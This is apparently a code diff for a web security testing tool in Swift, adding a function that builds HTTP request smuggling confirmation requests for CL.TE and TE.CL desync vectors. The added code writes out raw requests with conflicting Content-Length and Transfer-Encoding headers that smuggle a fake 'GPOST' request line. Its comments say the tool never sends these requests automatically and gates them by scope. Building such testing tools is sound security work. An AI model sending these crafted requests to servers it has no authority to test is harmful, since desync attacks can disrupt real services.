@@ -57,4 +57,68 @@ public enum SmugglingProbe {
     public static func isVulnerable(baseline: Double, probe: Double, threshold: Double = 3) -> Bool {
         probe - baseline >= threshold
     }
+
+    /// The marker method the confirmation smuggles. It is intentionally not a real HTTP method, so the
+    /// poisoned request draws a 4xx (rather than performing anything).
+    public static let confirmationMethod = "GPOST"
+
+    /// ADV-032: build a **self-poisoning** desync confirmation for `vector`. The attack request smuggles
+    /// the start of a new request whose method is the invalid `GPOST`; the back-end then prepends those
+    /// bytes to the *next* request on the **same connection** — the tester's own innocuous follow-up —
+    /// so that follow-up comes back as a 4xx that a clean request would not. Because it poisons only the
+    /// tester's own connection, it does not corrupt other users' traffic. It is **never sent
+    /// automatically**: the workbench constructs it, warns, and requires explicit, scope-gated action.
+    public static func confirmation(
+        _ vector: SmugglingVector, base: RawRequest
+    ) -> SmugglingConfirmation {
+        let (target, host) = head(base)
+        let smuggledRequestLine = "\(confirmationMethod) \(target) HTTP/1.1\r\nFoo: bar"
+        let attack: String
+        switch vector {
+        case .clte:
+            // Front-end honours Content-Length (forwards the whole body); back-end honours
+            // Transfer-Encoding and stops at `0\r\n\r\n`, leaving the `GPOST …` tail as the next request.
+            let tail = "0\r\n\r\n\(smuggledRequestLine)"
+            attack =
+                "POST \(target) HTTP/1.1\r\nHost: \(host)\r\nContent-Length: \(tail.utf8.count)\r\n"
+                + "Transfer-Encoding: chunked\r\n\r\n\(tail)"
+        case .tecl:
+            // Front-end honours Transfer-Encoding (reads the whole chunked body); back-end honours
+            // Content-Length and reads only the chunk-size line, leaving `GPOST …` as the next request.
+            let chunkHex = String(smuggledRequestLine.utf8.count, radix: 16)
+            let clLen = chunkHex.utf8.count + 2  // just "<hex>\r\n"
+            attack =
+                "POST \(target) HTTP/1.1\r\nHost: \(host)\r\nContent-Length: \(clLen)\r\n"
+                + "Transfer-Encoding: chunked\r\n\r\n\(chunkHex)\r\n\(smuggledRequestLine)\r\n0\r\n\r\n"
+        }
+        let followUp = "GET \(target) HTTP/1.1\r\nHost: \(host)\r\nConnection: close\r\n\r\n"
+        return SmugglingConfirmation(
+            vector: vector, attack: RawRequest(Bytes(attack)), followUp: RawRequest(Bytes(followUp)),
+            expectedSignal:
+                "the follow-up returns a 4xx (its request line was poisoned with the smuggled "
+                + "\(confirmationMethod) method); a clean connection returns the endpoint's normal status.")
+    }
+}
+
+/// ADV-032: a constructed, non-destructive desync confirmation — the attack that poisons the tester's
+/// own connection and the innocuous follow-up whose poisoned response proves the desync.
+public struct SmugglingConfirmation: Sendable, Equatable {
+    /// The vector being confirmed.
+    public let vector: SmugglingVector
+    /// The request that smuggles a `GPOST` request-start onto the connection.
+    public let attack: RawRequest
+    /// The innocuous follow-up sent next on the same connection; its response proves the desync.
+    public let followUp: RawRequest
+    /// A human description of the signal that confirms the desync.
+    public let expectedSignal: String
+
+    /// A confirmation.
+    public init(
+        vector: SmugglingVector, attack: RawRequest, followUp: RawRequest, expectedSignal: String
+    ) {
+        self.vector = vector
+        self.attack = attack
+        self.followUp = followUp
+        self.expectedSignal = expectedSignal
+    }
 }
